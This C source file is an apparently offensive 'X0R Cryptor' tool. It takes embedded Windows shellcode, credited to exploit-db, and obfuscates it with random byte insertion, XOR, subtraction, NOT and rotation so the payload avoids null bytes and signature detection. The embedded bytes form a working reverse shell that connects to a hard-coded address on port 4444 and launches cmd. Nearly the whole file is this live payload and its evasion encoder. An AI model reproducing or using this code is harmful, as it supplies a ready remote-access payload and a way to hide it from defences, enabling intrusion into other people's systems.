

/**
 * 
 *    ____  ___________    _______ __________ 
 *    \   \/  /\______ \   \      \\______   \
 *     \     /  |    |  \  /   |   \|       _/
 *     /     \  |    `   \/    |    \    |   \
 *    /___/\  \/_______  /\____|__  /____|_  /
 *          \_/        \/         \/       \/ 
 *
 * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 * 
 * [*] X0R Cryptor with DEC/N0T/R0R encoder plus random byte insertion encoder
 * [*] Author: @xen0vas
 *
 * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 * 
 */

#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>

#define DEC 0x2 // the value that will be used to substract every byte

#define ANSI_COLOR_RED     "\x1b[01;31m"
#define ANSI_COLOR_GREEN   "\x1b[01;32m"
#define ANSI_COLOR_YELLOW  "\x1b[01;33m"
#define ANSI_COLOR_BLUE    "\x1b[01;34m"
#define ANSI_COLOR_MAGENTA "\x1b[01;35m"
#define ANSI_COLOR_CYAN    "\x1b[01;36m"
#define ANSI_COLOR_RESET   "\x1b[0m"

unsigned char XORKEY[] = { 0x73, 0x65, 0x63, 0x72, 0x65, 0x74, 0x6B, 0x65, 0x79 }; // secretkey

/* https://www.exploit-db.com/shellcodes/50291 */
unsigned char shellcode[] = \
"\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x96\xad\x8b"
"\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x31"
"\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f"
"\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01\xde"
"\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x31\xc9\x53"
"\x52\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54"
"\x53\x89\xde\xff\xd2\x83\xc4\x0c\x5a\x50\x52\x66\xba\x6c\x6c\x52\x68\x33"
"\x32\x2e\x64\x68\x77\x73\x32\x5f\x54\xff\xd0\x83\xc4\x10\x8b\x54\x24\x04"
"\x68\x75\x70\x61\x61\x66\x81\x6c\x24\x02\x61\x61\x68\x74\x61\x72\x74\x68"
"\x57\x53\x41\x53\x54\x50\x89\xc7\xff\xd2\x31\xdb\x66\xbb\x90\x01\x29\xdc"
"\x54\x53\xff\xd0\x83\xc4\x10\x31\xdb\x80\xc3\x04\x6b\xdb\x64\x8b\x14\x1c"
"\x68\x74\x41\x61\x61\x66\x81\x6c\x24\x02\x61\x61\x68\x6f\x63\x6b\x65\x68"
"\x57\x53\x41\x53\x54\x89\xf8\x50\xff\xd2\x57\x31\xc9\x52\x52\x52\xb2\x06"
"\x52\x41\x51\x41\x51\xff\xd0\x91\x5f\x83\xc4\x10\x31\xdb\x80\xc3\x04\x6b"
"\xdb\x63\x8b\x14\x1c\x68\x65\x63\x74\x61\x66\x83\x6c\x24\x03\x61\x68\x63"
"\x6f\x6e\x6e\x54\x57\x87\xcd\xff\xd2\x68\xc0\xa8\xc9\x0b\x66\x68\x11\x5c"
"\x31\xdb\x80\xc3\x02\x66\x53\x89\xe2\x6a\x10\x52\x55\x87\xef\xff\xd0\x83"
"\xc4\x14\x31\xdb\x80\xc3\x04\x6b\xdb\x62\x8b\x14\x1c\x68\x73\x41\x61\x61"
"\x81\x6c\x24\x02\x61\x61\x00\x00\x68\x6f\x63\x65\x73\x68\x74\x65\x50\x72"
"\x68\x43\x72\x65\x61\x54\x89\xf5\x55\xff\xd2\x50\x8d\x28\x68\x63\x6d\x64"
"\x61\x66\x83\x6c\x24\x03\x61\x89\xe1\x31\xd2\x83\xec\x10\x89\xe3\x57\x57"
"\x57\x52\x52\x31\xc0\x40\xc1\xc0\x08\x50\x52\x52\x52\x52\x52\x52\x52\x52"
"\x52\x52\x31\xc0\x04\x2c\x50\x89\xe0\x53\x50\x52\x52\x52\x31\xc0\x40\x50"
"\x52\x52\x51\x52\xff\xd5";

void banner(){
printf(ANSI_COLOR_YELLOW);
printf("                                                        \n");
printf("  ▄       ▄  ▄▄▄▄▄▄▄▄▄▄   ▄▄        ▄  ▄▄▄▄▄▄▄▄▄▄▄      \n");
printf(" ▐░▌     ▐░▌▐░░░░░░░░░░▌ ▐░░▌      ▐░▌▐░░░░░░░░░░░▌     \n");
printf("  ▐░▌   ▐░▌ ▐░█▀▀▀▀▀▀▀█░▌▐░▌░▌     ▐░▌▐░█▀▀▀▀▀▀▀█░▌     \n");
printf("   ▐░▌ ▐░▌  ▐░▌       ▐░▌▐░▌▐░▌    ▐░▌▐░▌       ▐░▌     \n");
printf("    ▐░▐░▌   ▐░▌       ▐░▌▐░▌ ▐░▌   ▐░▌▐░█▄▄▄▄▄▄▄█░▌     \n");
printf("     ▐░▌    ▐░▌       ▐░▌▐░▌  ▐░▌  ▐░▌▐░░░░░░░░░░░▌     \n");
printf("    ▐░▌░▌   ▐░▌       ▐░▌▐░▌   ▐░▌ ▐░▌▐░█▀▀▀▀█░█▀▀      \n");
printf("   ▐░▌ ▐░▌  ▐░▌       ▐░▌▐░▌    ▐░▌▐░▌▐░▌     ▐░▌       \n");
printf("  ▐░▌   ▐░▌ ▐░█▄▄▄▄▄▄▄█░▌▐░▌     ▐░▐░▌▐░▌      ▐░▌      \n");
printf(" ▐░▌     ▐░▌▐░░░░░░░░░░▌ ▐░▌      ▐░░▌▐░▌       ▐░▌     \n");
printf("  ▀       ▀  ▀▀▀▀▀▀▀▀▀▀   ▀        ▀▀  ▀         ▀      \n");
printf("                                                        \n\n");
printf("[*] Author:"ANSI_COLOR_MAGENTA" @xen0vas "ANSI_COLOR_RESET"\n");
}

int main(void)
{
        banner();
        printf(ANSI_COLOR_YELLOW"[*] X0R Cryptor with DEC/N0T/R0R encoder v1.0.0\n\n");
        printf(ANSI_COLOR_BLUE);
        printf("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n");
        printf(ANSI_COLOR_RESET);

        int rot,kk,ll,i,l,k,j; 

        int key_len = sizeof(XORKEY);

        lol:

        rot = 4; //right rotation 4 bits
        unsigned char *buffer = (unsigned char*)malloc(sizeof(unsigned char));
        srand((unsigned int)time(NULL));

        unsigned char *shellcode2 =(unsigned char*)malloc(sizeof(char*) * (((sizeof(shellcode)-1)*2)/8) );
        memset(shellcode2, '\0', sizeof(char*) * (((sizeof(shellcode)-1)*2)/8) );

        // placeholder to copy the random bytes using rand
        unsigned char shellcode3[] = "\xbb";

        unsigned char *shellcode4 = (unsigned char*)malloc(sizeof(char*) * (((sizeof(shellcode)-1)*2)/8) );
        memset(shellcode4, '\0', sizeof(char*) * (((sizeof(shellcode)-1)*2)/8) ); 

        l = 0;
        k = 0;
        
        // random byte insertion into even location
        /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/

        for (i=0; i<((sizeof(shellcode)-1)*2); i++) 
        {
                // generate random bytes
                buffer[0] = rand() & 0xff;              
                memcpy(&shellcode3[0],(char*)&buffer[0],sizeof(buffer[0]));
                k = i % 2;
                if (k == 0)
                {
                        shellcode2[i] = shellcode[l];
                        l++;
                }
                else if ( k != 0 )
                {
                        shellcode2[i] = shellcode3[0];
                }
        }
        
        kk = 0;
        ll = 0;

        // Beat the nulls !
        buffer[0] = rand() & 0xff;

        for (i=0; i<(sizeof(shellcode)-1)*2; i++) 
        {

                if (kk == key_len) kk = 0;

                // XOR every byte with secretkey
                shellcode2[i] = shellcode2[i] ^ XORKEY[kk]; 

                shellcode2[i] = shellcode2[i] ^ buffer[0];

                printf ("\r"ANSI_COLOR_YELLOW"[!]"ANSI_COLOR_GREEN" The magic byte to avoid nulls :"ANSI_COLOR_RED" 0x%02x"ANSI_COLOR_RESET, buffer[0] ); 

                // subtract every byte by 2
                shellcode2[i] = shellcode2[i] - DEC;
                
                // one's complement negation
                shellcode2[i] = ~shellcode2[i];
                
                // perform the ROR method 
                shellcode2[i] = (shellcode2[i] << rot) | (shellcode2[i] >> sizeof(shellcode2[i])*(8-rot));    

                if (shellcode2[i] == 0) 
                {
                    free(shellcode4); 
                    free(shellcode2);
                    free(buffer);
                    ll++;
                    break;
                }
               
                kk++;
        }
        if ( ll > 0) goto lol;
        
        /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
        
        for (i=0; i<(sizeof(shellcode)-1)*2; i++) {
                memcpy(&shellcode4[i], (unsigned char*)&shellcode2[i],sizeof(shellcode2[i]));
        }

        printf(ANSI_COLOR_YELLOW"\n[*]"ANSI_COLOR_GREEN" The secret Key : ");
        for (int g=0; g<=sizeof(key_len); g++) 
        {
            if (g==sizeof(key_len))
                   printf(ANSI_COLOR_RED"0x%02x"ANSI_COLOR_RESET, XORKEY[g]);
            if (g<sizeof(key_len))
                     printf(ANSI_COLOR_RED"0x%02x, "ANSI_COLOR_RESET, XORKEY[g]);
        }

        printf("\n"ANSI_COLOR_YELLOW"[*]"ANSI_COLOR_GREEN" Original Shellcode Length : "ANSI_COLOR_RED"%lu\n\n", sizeof(shellcode)-1);

        printf(ANSI_COLOR_BLUE);
        printf("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
        printf(ANSI_COLOR_RESET);

        printf("\n\n"ANSI_COLOR_YELLOW"[-]"ANSI_COLOR_GREEN" Encrypted shellcode :"ANSI_COLOR_RESET"\n\n");


        for (i=0; i<(sizeof(shellcode)-1)*2; i++) 
        {
             if (i==0)
                     printf(ANSI_COLOR_MAGENTA"unsigned char"ANSI_COLOR_RESET" shellcode[]"ANSI_COLOR_YELLOW" = "ANSI_COLOR_RESET"{ "ANSI_COLOR_YELLOW"0x%02x, "ANSI_COLOR_RESET"",shellcode4[i]); 
             if (i>0 && i<((sizeof(shellcode)-1)*2)-1)
                     printf(ANSI_COLOR_YELLOW"0x%02x, "ANSI_COLOR_RESET"",shellcode4[i]);
             if (i == ((sizeof(shellcode)-1)*2)-1)
                       printf(ANSI_COLOR_YELLOW"0x%02x"ANSI_COLOR_RESET" };",shellcode4[i]);
        }

        printf("\033[01;32m");
        printf("\n\n"ANSI_COLOR_YELLOW"[-]"ANSI_COLOR_GREEN" Encoded Shellcode Length : "ANSI_COLOR_RED"%ld\n"ANSI_COLOR_RESET,(sizeof(shellcode)-1)*2);
        printf("\n\n");
        return 0;
 }

/* @xen0vas */ 

